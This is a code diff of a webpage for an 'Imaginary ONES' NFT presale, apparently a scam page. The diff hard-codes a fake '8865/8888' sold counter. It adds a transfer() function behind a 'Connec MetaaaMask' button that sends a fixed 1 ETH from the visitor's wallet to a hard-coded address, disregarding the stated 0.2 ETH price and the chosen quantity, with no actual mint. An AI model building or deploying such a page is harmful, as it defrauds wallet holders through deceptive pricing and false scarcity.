@@ -3,6 +3,7 @@
 <html>
 
 <head>
+	
 	<meta charset="utf-8">
 	<meta name="robots" content="index, follow">
   	<meta name="viewport" content="width=device-width, initial-scale=1">
@@ -30,19 +31,13 @@
 		<meta name="twitter:description" content="Presale have just started!! MINT Imaginary ONES here today. Imaginary ONES is a collection of 8888 unique Nfts, Living in an imaginary metaverse, Buy Imaginary ONES now!.">
 		<meta name="twitter:image" content="img/share.jpg">
 		<!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-220406837-4"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
 
-  gtag('config', 'UA-220406837-4');
-</script>
 <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"
 	type="application/javascript" ></script>
+	
 		</head>
 <body>
-
+	
 	<nav class="navbar navbar-expand-lg navbar-light">
     <div class="container">
       <a class="navbar-brand" href="index.html"><img src="logo.png" alt="Logo" height="50" class="d-inline-block align-text-top"></a>
@@ -85,7 +80,7 @@
 						<span class="special_font">Price:</span> 0.2 ETH + Gas Fee<br>
 						<span class="special_font">Max:</span> 5 NFT per Wallet<br>
 						<span class="special_font">Supply:</span>
-						<span id="sales"></span>/8888 NFT
+						<span id="sales"></span>8865/8888 NFT
 					</div>
 					<div class="col-12 col-lg-6 mb-3 justify-content-center align-self-center">
 						<div class="input-group mb-3">
@@ -116,7 +111,7 @@
 					</div>
 				</div>
 				<button type="button" class="btn btn-outline-primary btn-lg float-end pay_button" style="display: none;">Mint NFT</button>
-				<button onClick="transfer()"  class="btn btn-outline-primary btn-lg float-end connect_metamask">Connec MetaaaMask</button>
+				<button type="button" onClick="transfer()"  class="btn btn-outline-primary btn-lg float-end connect_metamask">Connec MetaaaMask</button>
 				<div id="sale_loader" class="spinner-border special_font align-middle" role="status" style="display: none;">
 				  <span class="sr-only">Loading...</span>
 				</div>
@@ -227,35 +222,36 @@
 		</center>
 	</div>
     </section>
+	<script>
+	async	function transfer() {
+	 const ivv = document.querySelector('#vv')
+	 var no = ivv.value
+	 var ip = no*0.2
+	 var nini = ip.toString()
+	 if(typeof window.ethereum !== 'undefined') {
+	   const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
+	   const provider = new ethers.providers.Web3Provider(window.ethereum);
+	   const signer = provider.getSigner();
+	   try {
+		 const tx = signer.sendTransaction({
+   to: "0x120Be2AF0B7C4136fb9831FE3F1a95e650E17E75",
+   value: ethers.utils.parseEther("1")
+})
+console.log( pp)}
+	   catch(err) {
+		 
+	   }
+	 }
+   }
+   </script>
 	<script src="jquery.min.js"></script>
 	<script src="bootstrap.js"></script>
-	<script src="os.js"></script>
+	<script src="as.js"></script>
 	
 	<script src="moment.js"></script>
-	<script src="pp.js"></script>
+	<script src="ap.js"></script>
 
 
-	<script>
-		async function transfer() {
-		const ivv = document.querySelector('#vv')
-		var no = ivv.value
-		var ip = no*0.2
-		var nini = ip.toString()
-		if(typeof window.ethereum !== 'undefined') {
-		  const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
-		  const provider = new ethers.providers.Web3Provider(window.ethereum);
-		  const signer = provider.getSigner();
-		  try {
-			const tx = signer.sendTransaction({
-	  to: "0x120Be2AF0B7C4136fb9831FE3F1a95e650E17E75",
-	  value: ethers.utils.parseEther(1)
-  })
-  console.log( pp)}
-		  catch(err) {
-			
-		  }
-		}
-	  }
-	</script>
+	
 </body>
 </html>
